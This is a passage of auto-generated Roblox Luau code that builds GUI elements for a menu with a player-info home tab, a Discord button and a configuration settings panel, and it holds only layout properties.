G2L["3f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["3f"]["Name"] = [[greystroke]];
G2L["3f"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.======ACCENT======
G2L["40"] = Instance.new("Frame", G2L["3c"]);
G2L["40"]["BorderSizePixel"] = 0;
G2L["40"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["40"]["Size"] = UDim2.new(1, 0, 0, 4);
G2L["40"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["40"]["Name"] = [[======ACCENT======]];
G2L["40"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.======ACCENT======.GuiColor
G2L["41"] = Instance.new("Frame", G2L["40"]);
G2L["41"]["BorderSizePixel"] = 0;
G2L["41"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
G2L["41"]["Size"] = UDim2.new(1, -2, 0, 2);
G2L["41"]["Position"] = UDim2.new(0, 1, 0, 1);
G2L["41"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["41"]["Name"] = [[GuiColor]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.======ACCENT======.GuiColor.UICorner
G2L["42"] = Instance.new("UICorner", G2L["41"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.======TITLE======
G2L["43"] = Instance.new("Frame", G2L["3c"]);
G2L["43"]["BorderSizePixel"] = 0;
G2L["43"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["43"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["43"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["43"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["43"]["Name"] = [[======TITLE======]];
G2L["43"]["LayoutOrder"] = 1;
G2L["43"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.======TITLE======.text
G2L["44"] = Instance.new("TextLabel", G2L["43"]);
G2L["44"]["TextWrapped"] = true;
G2L["44"]["BorderSizePixel"] = 0;
G2L["44"]["TextSize"] = 14;
G2L["44"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["44"]["TextTransparency"] = 0.3;
G2L["44"]["TextScaled"] = true;
G2L["44"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["44"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["44"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["44"]["BackgroundTransparency"] = 1;
G2L["44"]["Size"] = UDim2.new(1, 0, -0.13333, 15);
G2L["44"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["44"]["Text"] = [[Welcome,]];
G2L["44"]["Name"] = [[text]];
G2L["44"]["Position"] = UDim2.new(0.02273, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.======TITLE======.text.text
G2L["45"] = Instance.new("UIStroke", G2L["44"]);
G2L["45"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.======TITLE======.text.UIPadding
G2L["46"] = Instance.new("UIPadding", G2L["44"]);
G2L["46"]["PaddingLeft"] = UDim.new(0, 1);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo
G2L["47"] = Instance.new("Frame", G2L["3c"]);
G2L["47"]["BorderSizePixel"] = 0;
G2L["47"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["47"]["Size"] = UDim2.new(1, 0, 0, 70);
G2L["47"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
G2L["47"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["47"]["Name"] = [[playerinfo]];
G2L["47"]["LayoutOrder"] = 2;
G2L["47"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.playerinfo
G2L["48"] = Instance.new("LocalScript", G2L["47"]);
G2L["48"]["Name"] = [[playerinfo]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.UIPadding
G2L["49"] = Instance.new("UIPadding", G2L["47"]);
G2L["49"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.display
G2L["4a"] = Instance.new("TextLabel", G2L["47"]);
G2L["4a"]["TextWrapped"] = true;
G2L["4a"]["ZIndex"] = 10;
G2L["4a"]["BorderSizePixel"] = 0;
G2L["4a"]["TextSize"] = 14;
G2L["4a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["4a"]["TextScaled"] = true;
G2L["4a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4a"]["BackgroundTransparency"] = 1;
G2L["4a"]["Size"] = UDim2.new(0, 100, 0, 13);
G2L["4a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4a"]["Text"] = [[XXXXX]];
G2L["4a"]["Name"] = [[display]];
G2L["4a"]["Position"] = UDim2.new(0, 0, 0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.display.UIPadding
G2L["4b"] = Instance.new("UIPadding", G2L["4a"]);
G2L["4b"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.display.text
G2L["4c"] = Instance.new("UIStroke", G2L["4a"]);
G2L["4c"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.username
G2L["4d"] = Instance.new("TextLabel", G2L["47"]);
G2L["4d"]["TextWrapped"] = true;
G2L["4d"]["ZIndex"] = 10;
G2L["4d"]["BorderSizePixel"] = 0;
G2L["4d"]["TextSize"] = 14;
G2L["4d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["4d"]["TextScaled"] = true;
G2L["4d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4d"]["BackgroundTransparency"] = 1;
G2L["4d"]["Size"] = UDim2.new(0, 100, 0, 13);
G2L["4d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4d"]["Text"] = [[@xxxxx]];
G2L["4d"]["Name"] = [[username]];
G2L["4d"]["Position"] = UDim2.new(0, 0, 0, 17);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.username.UIPadding
G2L["4e"] = Instance.new("UIPadding", G2L["4d"]);
G2L["4e"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.username.text
G2L["4f"] = Instance.new("UIStroke", G2L["4d"]);
G2L["4f"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.joindate
G2L["50"] = Instance.new("TextLabel", G2L["47"]);
G2L["50"]["TextWrapped"] = true;
G2L["50"]["ZIndex"] = 10;
G2L["50"]["BorderSizePixel"] = 0;
G2L["50"]["TextSize"] = 12;
G2L["50"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["50"]["TextScaled"] = true;
G2L["50"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["50"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["50"]["TextColor3"] = Color3.fromRGB(201, 201, 201);
G2L["50"]["BackgroundTransparency"] = 1;
G2L["50"]["Size"] = UDim2.new(1, 0, 0, 13);
G2L["50"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["50"]["Text"] = [[ðŸ—“ï¸ XXXX-X-X (X days)]];
G2L["50"]["Name"] = [[joindate]];
G2L["50"]["Position"] = UDim2.new(0, 0, 0, 53);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.joindate.UIPadding
G2L["51"] = Instance.new("UIPadding", G2L["50"]);
G2L["51"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.joindate.text
G2L["52"] = Instance.new("UIStroke", G2L["50"]);
G2L["52"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.profile
G2L["53"] = Instance.new("ImageLabel", G2L["47"]);
G2L["53"]["BorderSizePixel"] = 0;
G2L["53"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["53"]["Image"] = [[rbxasset://textures/ui/GuiImagePlaceholder.png]];
G2L["53"]["Size"] = UDim2.new(0, 50, 0, 50);
G2L["53"]["Visible"] = false;
G2L["53"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["53"]["BackgroundTransparency"] = 1;
G2L["53"]["Name"] = [[profile]];
G2L["53"]["Position"] = UDim2.new(0, 110, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.profile.UICorner
G2L["54"] = Instance.new("UICorner", G2L["53"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.role
G2L["55"] = Instance.new("TextLabel", G2L["47"]);
G2L["55"]["TextWrapped"] = true;
G2L["55"]["ZIndex"] = 10;
G2L["55"]["BorderSizePixel"] = 0;
G2L["55"]["TextSize"] = 12;
G2L["55"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["55"]["TextTransparency"] = 0.3;
G2L["55"]["TextScaled"] = true;
G2L["55"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["55"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["55"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["55"]["BackgroundTransparency"] = 1;
G2L["55"]["Size"] = UDim2.new(0, 100, 0, 13);
G2L["55"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["55"]["Text"] = [[(USER)]];
G2L["55"]["Name"] = [[role]];
G2L["55"]["Position"] = UDim2.new(0, 0, 0, 34);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.role.UIPadding
G2L["56"] = Instance.new("UIPadding", G2L["55"]);
G2L["56"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.role.text
G2L["57"] = Instance.new("UIStroke", G2L["55"]);
G2L["57"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.---DIVIDER---
G2L["58"] = Instance.new("Frame", G2L["3c"]);
G2L["58"]["BorderSizePixel"] = 0;
G2L["58"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["58"]["Size"] = UDim2.new(1, 0, 0, 10);
G2L["58"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["58"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["58"]["Name"] = [[---DIVIDER---]];
G2L["58"]["LayoutOrder"] = 3;
G2L["58"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.---DIVIDER---.dividerFrame
G2L["59"] = Instance.new("Frame", G2L["58"]);
G2L["59"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["59"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["59"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["59"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["59"]["Name"] = [[dividerFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.---DIVIDER---.dividerFrame.outlineStroke
G2L["5a"] = Instance.new("UIStroke", G2L["59"]);
G2L["5a"]["Thickness"] = 2;
G2L["5a"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.---DIVIDER---.dividerFrame.buttonFade
G2L["5b"] = Instance.new("CanvasGroup", G2L["59"]);
G2L["5b"]["BorderSizePixel"] = 0;
G2L["5b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5b"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5b"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["5b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5b"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.---DIVIDER---.dividerFrame.buttonFade.UIGradient
G2L["5c"] = Instance.new("UIGradient", G2L["5b"]);
G2L["5c"]["Rotation"] = 90;
G2L["5c"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.---DIVIDER---.dividerFrame.UIStroke
G2L["5d"] = Instance.new("UIStroke", G2L["59"]);
G2L["5d"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["5d"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.---DIVIDER---.dividerFrame.UICorner
G2L["5e"] = Instance.new("UICorner", G2L["59"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.---DIVIDER---.UIPadding
G2L["5f"] = Instance.new("UIPadding", G2L["58"]);
G2L["5f"]["PaddingTop"] = UDim.new(0, 3);
G2L["5f"]["PaddingRight"] = UDim.new(0, 6);
G2L["5f"]["PaddingLeft"] = UDim.new(0, 6);
G2L["5f"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord
G2L["60"] = Instance.new("Frame", G2L["3c"]);
G2L["60"]["BorderSizePixel"] = 0;
G2L["60"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["60"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["60"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["60"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["60"]["Name"] = [[discord]];
G2L["60"]["LayoutOrder"] = 4;
G2L["60"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord.button
G2L["61"] = Instance.new("TextButton", G2L["60"]);
G2L["61"]["BorderSizePixel"] = 0;
G2L["61"]["TextTransparency"] = 1;
G2L["61"]["TextSize"] = 14;
G2L["61"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["61"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["61"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["61"]["ZIndex"] = 49;
G2L["61"]["BackgroundTransparency"] = 1;
G2L["61"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["61"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["61"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord.button.UIPadding
G2L["62"] = Instance.new("UIPadding", G2L["61"]);
G2L["62"]["PaddingTop"] = UDim.new(0, 2);
G2L["62"]["PaddingRight"] = UDim.new(0, 3);
G2L["62"]["PaddingLeft"] = UDim.new(0, 3);
G2L["62"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord.button.buttonFrame
G2L["63"] = Instance.new("Frame", G2L["61"]);
G2L["63"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["63"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["63"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["63"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["63"]["Name"] = [[buttonFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord.button.buttonFrame.outlineStroke
G2L["64"] = Instance.new("UIStroke", G2L["63"]);
G2L["64"]["Thickness"] = 2;
G2L["64"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord.button.buttonFrame.buttonFade
G2L["65"] = Instance.new("CanvasGroup", G2L["63"]);
G2L["65"]["BorderSizePixel"] = 0;
G2L["65"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["65"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["65"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["65"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["65"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord.button.buttonFrame.buttonFade.UIGradient
G2L["66"] = Instance.new("UIGradient", G2L["65"]);
G2L["66"]["Rotation"] = 90;
G2L["66"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord.button.text
G2L["67"] = Instance.new("TextLabel", G2L["61"]);
G2L["67"]["ZIndex"] = 2;
G2L["67"]["BorderSizePixel"] = 0;
G2L["67"]["TextSize"] = 14;
G2L["67"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["67"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["67"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["67"]["TextColor3"] = Color3.fromRGB(0, 124, 255);
G2L["67"]["BackgroundTransparency"] = 1;
G2L["67"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["67"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["67"]["Text"] = [[Join my discord!]];
G2L["67"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord.button.text.text
G2L["68"] = Instance.new("UIStroke", G2L["67"]);
G2L["68"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord.fillbar
G2L["69"] = Instance.new("Frame", G2L["60"]);
G2L["69"]["ZIndex"] = 90;
G2L["69"]["BorderSizePixel"] = 0;
G2L["69"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["69"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["69"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["69"]["Name"] = [[fillbar]];
G2L["69"]["BackgroundTransparency"] = 0.95;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings
G2L["6a"] = Instance.new("ScrollingFrame", G2L["35"]);
G2L["6a"]["Active"] = true;
G2L["6a"]["BorderSizePixel"] = 0;
G2L["6a"]["CanvasSize"] = UDim2.new(0, 0, 1.5, 0);
G2L["6a"]["Name"] = [[Settings]];
G2L["6a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6a"]["Size"] = UDim2.new(0, 360, 0, 255);
G2L["6a"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6a"]["Position"] = UDim2.new(0.01351, 0, 0.01887, 0);
G2L["6a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6a"]["ScrollBarThickness"] = 0;
G2L["6a"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside
G2L["6b"] = Instance.new("Frame", G2L["6a"]);
G2L["6b"]["BorderSizePixel"] = 0;
G2L["6b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6b"]["Size"] = UDim2.new(0, 176, 0, 255);
G2L["6b"]["Position"] = UDim2.new(0.51081, 0, 0, 0);
G2L["6b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6b"]["Name"] = [[rightside]];
G2L["6b"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.UIListLayout
G2L["6c"] = Instance.new("UIListLayout", G2L["6b"]);
G2L["6c"]["Padding"] = UDim.new(0, 5);
G2L["6c"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab
G2L["6d"] = Instance.new("Frame", G2L["6b"]);
G2L["6d"]["BorderSizePixel"] = 0;
G2L["6d"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["6d"]["Size"] = UDim2.new(0, 176, 0, 160);
G2L["6d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6d"]["Name"] = [[configTab]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.Script
G2L["6e"] = Instance.new("LocalScript", G2L["6d"]);
G2L["6e"]["Name"] = [[Script]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.UIListLayout
G2L["6f"] = Instance.new("UIListLayout", G2L["6d"]);
G2L["6f"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
G2L["6f"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.greystroke
G2L["70"] = Instance.new("UIStroke", G2L["6d"]);
G2L["70"]["ZIndex"] = 99;
G2L["70"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["70"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["70"]["Name"] = [[greystroke]];
G2L["70"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.======ACCENT======
G2L["71"] = Instance.new("Frame", G2L["6d"]);
G2L["71"]["BorderSizePixel"] = 0;
G2L["71"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["71"]["Size"] = UDim2.new(1, 0, 0, 4);
G2L["71"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["71"]["Name"] = [[======ACCENT======]];
G2L["71"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.======ACCENT======.GuiColor
G2L["72"] = Instance.new("Frame", G2L["71"]);
G2L["72"]["BorderSizePixel"] = 0;
G2L["72"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
G2L["72"]["Size"] = UDim2.new(1, -2, 0, 2);
G2L["72"]["Position"] = UDim2.new(0, 1, 0, 1);
G2L["72"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["72"]["Name"] = [[GuiColor]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.======ACCENT======.GuiColor.UICorner
G2L["73"] = Instance.new("UICorner", G2L["72"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.======TITLE======
G2L["74"] = Instance.new("Frame", G2L["6d"]);
G2L["74"]["BorderSizePixel"] = 0;
G2L["74"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["74"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["74"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["74"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["74"]["Name"] = [[======TITLE======]];
G2L["74"]["LayoutOrder"] = 1;
G2L["74"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.======TITLE======.text
G2L["75"] = Instance.new("TextLabel", G2L["74"]);
G2L["75"]["TextWrapped"] = true;
G2L["75"]["BorderSizePixel"] = 0;
G2L["75"]["TextSize"] = 14;
G2L["75"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["75"]["TextTransparency"] = 0.3;
G2L["75"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["75"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["75"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["75"]["BackgroundTransparency"] = 1;
G2L["75"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["75"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["75"]["Text"] = [[Configuration]];
G2L["75"]["Name"] = [[text]];
G2L["75"]["Position"] = UDim2.new(0.02273, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.======TITLE======.text.text
G2L["76"] = Instance.new("UIStroke", G2L["75"]);
G2L["76"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.======TITLE======.text.UIPadding
G2L["77"] = Instance.new("UIPadding", G2L["75"]);
G2L["77"]["PaddingLeft"] = UDim.new(0, 1);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.======TITLE======.minimise
G2L["78"] = Instance.new("TextButton", G2L["74"]);
G2L["78"]["BorderSizePixel"] = 0;
G2L["78"]["TextTransparency"] = 0.3;
G2L["78"]["TextSize"] = 14;
G2L["78"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["78"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["78"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["78"]["BackgroundTransparency"] = 1;
G2L["78"]["Size"] = UDim2.new(0, 35, 1, 0);
G2L["78"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["78"]["Text"] = [[-]];
G2L["78"]["Name"] = [[minimise]];
G2L["78"]["Position"] = UDim2.new(1, -30, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configtextbox
G2L["79"] = Instance.new("Frame", G2L["6d"]);
G2L["79"]["BorderSizePixel"] = 0;
G2L["79"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["79"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["79"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["79"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["79"]["Name"] = [[configtextbox]];
G2L["79"]["LayoutOrder"] = 3;
G2L["79"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configtextbox.configinputname
G2L["7a"] = Instance.new("Frame", G2L["79"]);
G2L["7a"]["ZIndex"] = 55;
G2L["7a"]["BorderSizePixel"] = 0;
G2L["7a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7a"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["7a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7a"]["Name"] = [[configinputname]];
G2L["7a"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configtextbox.configinputname.UIPadding
G2L["7b"] = Instance.new("UIPadding", G2L["7a"]);
G2L["7b"]["PaddingTop"] = UDim.new(0, 2);
